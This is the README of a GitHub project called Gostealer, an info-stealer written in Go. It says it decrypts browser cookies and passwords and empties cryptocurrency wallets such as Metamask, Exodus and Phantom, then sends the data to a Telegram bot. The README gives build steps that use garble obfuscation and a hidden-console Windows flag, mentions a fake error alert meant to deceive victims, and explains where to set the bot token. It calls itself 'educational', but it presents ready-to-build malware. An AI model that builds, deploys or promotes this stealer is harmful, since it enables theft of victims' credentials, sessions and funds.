# Gostealer

![telegram](https://github.com/4kord/gostealer/blob/main/telegram.png?raw=true)

Gostealer is an educational project that decodes and sends all cookies, passwords and cryptocurrency wallets from chromium (and not only) browsers.

- Small runtime
- Fake error alert

#### Supported browsers

- Chrome
- Edge
- Firefox
- Opera
- OperaGX

#### Supported cryptocurrency wallets

- Atomic
- Binancechain
- Electrum
- Exodus
- Metamask
- Phantom
- Ronin
- Tronlink

## Installation
### From source
* Clone the repo
```sh
# You must have git preinstalled
git clone https://github.com/4kord/gostealer.git
```

* Install Go
```sh
# For Debian (Ubuntu, Xubuntu etc)
apt install golang

# For Arch (Endeavour, Manjaro etc)
pacman -S golang

# For macOS
brew install golang
```
* Compile
```sh
# Change current directory to the cloned one and run make command
cd gostealer
garble -seed=random build -ldflags -H=windowsgui # Make sure garble is installed
```
And that's it! Make should create a build folder, move there and run the program.

Look at this [repository](https://github.com/burrowers/garble) to find out how to install garble 

## Usage

You might want to change **bot token** and **archive password**
- Bot token is stored in *main.go*
- Archive password is stored in *utils/zip.go*
